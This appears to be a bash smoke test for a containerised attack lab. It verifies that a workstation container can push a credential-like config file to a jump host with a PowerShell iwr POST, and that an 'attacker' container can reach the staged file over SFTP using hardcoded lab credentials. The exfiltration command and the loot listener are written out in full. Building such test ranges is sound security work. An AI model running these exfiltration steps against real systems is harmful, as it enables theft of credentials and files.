#!/usr/bin/env bash
# Enterprise zone exfil chain smoke test.
#
# Coverage:
#   bursar-desk: iwr -InFile pushes ops-access.conf to wizzards-retreat via the
#                enterprise NIC (10.10.1.3); unseen-gate can stat the staged file
#                via SFTP.
#
# Usage: bash tests/smoke/test_enterprise_zone_exfil.sh
set -uo pipefail

REPO="$(cd "$(dirname "$0")/../.." && pwd)"
source "$REPO/tests/smoke/lib.sh"

BURSAR="bursar-desk"
JUMP="wizzards-retreat"
ATTACKER="unseen-gate"

require_running "$BURSAR"
require_running "$JUMP"
require_running "$ATTACKER"

ps1() { in_container "$BURSAR" /usr/local/bin/win10shell.sh -c "$1"; }

# Staging area: clean slate before the run.
docker exec "$JUMP" bash -c \
    'mkdir -p /tmp/loot && rm -f /tmp/loot/ops-access.conf' 2>/dev/null

# ── bursar-desk: ops-access.conf ─────────────────────────────────────────────

echo "[exfil] bursar-desk ops-access.conf"

docker exec "$JUMP" bash -c '
rm -f /tmp/loot/ops-access.conf
python3 -c "
from http.server import HTTPServer, BaseHTTPRequestHandler
import os
class R(BaseHTTPRequestHandler):
    def do_POST(self):
        n = int(self.headers.get(\"Content-Length\", 0))
        os.makedirs(\"/tmp/loot\", exist_ok=True)
        open(\"/tmp/loot/ops-access.conf\", \"wb\").write(self.rfile.read(n))
        self.send_response(200)
        self.send_header("Content-Length", "2")
        self.end_headers()
        self.wfile.write(b"ok")
    def log_message(self, *a): pass
HTTPServer((\"10.10.1.3\", 19993), R).serve_forever()
" &>/dev/null &
' 2>/dev/null
for _i in $(seq 1 10); do
    docker exec "$JUMP" ss -tlnp 2>/dev/null | grep -q 19993 && break
    sleep 1
done

IWR_OUT="$(ps1 'iwr -Method POST -Uri http://10.10.1.3:19993/ops-access.conf -InFile AppData\Roaming\UUPLOps\ops-access.conf')"
assert_contains "$IWR_OUT" "200|StatusCode|ok" \
    "bursar-desk iwr -InFile POSTs ops-access.conf to wizzards-retreat (200)"
sleep 1
BYTES=$(docker exec "$JUMP" bash -c 'wc -c < /tmp/loot/ops-access.conf 2>/dev/null || echo 0')
docker exec "$JUMP" pkill -f 19993 2>/dev/null || true
if [ "${BYTES:-0}" -gt 0 ]; then
    ok "ops-access.conf staged on wizzards-retreat ($BYTES bytes)"
else
    fail "ops-access.conf staging failed (0 bytes on wizzards-retreat)"
fi

PULL_BYTES=$(docker exec -i "$ATTACKER" /opt/attacker-env/bin/python3 - <<'EOF' 2>/dev/null
import paramiko
t = paramiko.Transport(('10.10.0.10', 22))
t.connect(username='rincewind', password='wizzard')
sftp = paramiko.SFTPClient.from_transport(t)
try:
    print(sftp.stat('/tmp/loot/ops-access.conf').st_size)
except Exception:
    print(0)
t.close()
EOF
)
if [ "${PULL_BYTES:-0}" -gt 0 ]; then
    ok "unseen-gate can stat ops-access.conf on wizzards-retreat ($PULL_BYTES bytes)"
else
    fail "unseen-gate cannot stat ops-access.conf on wizzards-retreat"
fi

# ── Cleanup ───────────────────────────────────────────────────────────────────

docker exec "$JUMP" rm -rf /tmp/loot 2>/dev/null || true

summary
